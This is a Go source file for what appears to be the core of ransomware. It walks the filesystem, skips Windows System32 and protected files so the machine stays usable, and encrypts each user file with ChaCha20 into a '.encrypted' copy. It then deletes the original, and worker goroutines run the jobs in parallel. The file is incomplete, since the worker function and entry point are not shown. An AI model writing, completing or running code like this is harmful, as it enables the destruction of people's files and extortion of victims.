package main

import (
	"crypto/cipher"
	"io"
	"io/fs"
	"log"
	"os"
	"path/filepath"
	"strings"
	"sync"

	"golang.org/x/crypto/chacha20"
)

// do not want to encrypt system files, etc...
var ExcludePaths = []string{"C:\\Windows\\System32"}

type Encryptor struct {
	Key            []byte
	EncryptionChan chan string
	JobChan        chan string
	ErrChan        chan error
	Done           chan struct{}
	WorkerCount    int
	wg             *sync.WaitGroup
}

func (e *Encryptor) Enumerate(p string, d fs.DirEntry, err error) error {
	if err != nil {
		// do not want to encrypt files requiring escalated priveleges
		if os.IsPermission(err) {
			return nil
		}
		return err
	}

	for _, excluded := range ExcludePaths {
		if strings.HasPrefix(p, excluded) {
			return filepath.SkipDir
		}
	}

	if !d.IsDir() && !strings.HasSuffix(p, ".encrypted") {
		e.EncryptionChan <- p
	}

	return nil
}

func (e *Encryptor) Encrypt(path string) error {
	in, err := os.Open(path)
	if err != nil {
		return err
	}
	defer in.Close()

	out, err := os.Create(path + ".encrypted")
	if err != nil {
		return err
	}
	defer out.Close()

	realSmooth, err := chacha20.NewUnauthenticatedCipher(e.Key, make([]byte, chacha20.NonceSize))
	if err != nil {
		return err
	}

	streamWriter := cipher.StreamWriter{
		S: realSmooth,
		W: out,
	}

	if _, err := io.Copy(streamWriter, in); err != nil {
		return err
	}

	in.Close()
	return os.Remove(path)
}

// TODO: setup workers for go func() { encrypt() }()
func (e *Encryptor) ListenAndEncrypt() error {
	e.wg = new(sync.WaitGroup)
	e.wg.Add(e.WorkerCount)
	for range e.WorkerCount {
		go e.NewWorker()
	}

	for {
		select {
		case path := <-e.EncryptionChan:
			e.JobChan <- path
		case err := <-e.ErrChan:
			switch err {
			case nil:
				// do nothing
			default:
				log.Println(err)
			}
		case <-e.Done:
			close(e.JobChan)
			e.wg.Wait()
			return nil
		}
	}
}
